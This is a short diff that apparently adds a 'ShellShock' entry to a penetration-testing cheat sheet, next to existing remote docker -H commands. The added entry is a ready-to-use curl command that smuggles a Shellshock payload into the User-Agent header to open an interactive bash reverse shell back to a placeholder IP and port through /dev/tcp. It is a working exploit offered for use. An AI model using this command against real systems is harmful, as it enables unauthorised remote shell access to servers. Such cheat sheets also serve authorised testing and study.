@@ -307,3 +307,8 @@ docker -H <IP>:<HOST> ps -a
 
 docker -H <IP>:<HOST> images
 ```
+
+### [ShellShock]
+```
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" <URL>/x.sh
+```
